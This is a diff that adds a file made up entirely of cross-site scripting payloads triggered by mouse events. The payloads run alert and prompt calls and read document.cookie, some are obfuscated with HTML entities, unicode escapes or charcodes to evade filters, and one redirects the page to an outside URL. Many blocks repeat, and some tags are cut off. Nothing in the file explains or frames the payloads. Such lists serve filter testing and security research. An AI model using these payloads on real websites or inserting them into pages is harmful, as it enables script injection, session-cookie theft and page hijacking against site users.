@@ -1,0 +1,122 @@
+<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
+<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html
+onmousemove>
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></
+div><script>document.getElementById("div2").innerHTML =
+document.getElementById("div1").innerHTML;</script>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+<a&#32;href&#61;&#91;&#00;&#93;"&#00;
+onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%"
+onmouseover="prompt(1)">
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<div/onmouseover='alert(1)'> style="x:">
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"
+onclick="alert(1)">x</button>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+<a&#32;href&#61;&#91;&#00;&#93;"&#00;
+onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%"
+onmouseover="prompt(1)">
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<div/onmouseover='alert(1)'> style="x:">
+<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"
+onclick="alert(1)">x</button>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]
+<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
+"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/
+sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+><h1><IFRAME width="420" height="315" frameborder="0"
+onmouseover="document.location.href='https://www.youtube.com/channel/
+UC9Qa_gXarSmObPX3ooIQZr
+"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00;
+onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%"
+onmouseover="prompt(1)">
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<div/onmouseover='alert(1)'> style="x:">
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"
+onclick="alert(1)">x</button>
+<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
+<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html
+onmousemove>
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></
+div><script>document.getElementById("div2").innerHTML =
+document.getElementById("div1").innerHTML;</script>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00;
+onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%"
+onmouseover="prompt(1)">
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<div/onmouseover='alert(1)'> style="x:">
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"
+onclick="alert(1)">x</button>
+[color=red' onmouseover="alert('xss')"]mouse over[/color]
+<div onmouseover="document.vulnerable=true;">
+<img src="blah"onmouseover="document.vulnerable=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<div onmouseover="document.vulnerable=true;">
+<img src="blah"onmouseover="document.vulnerable=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
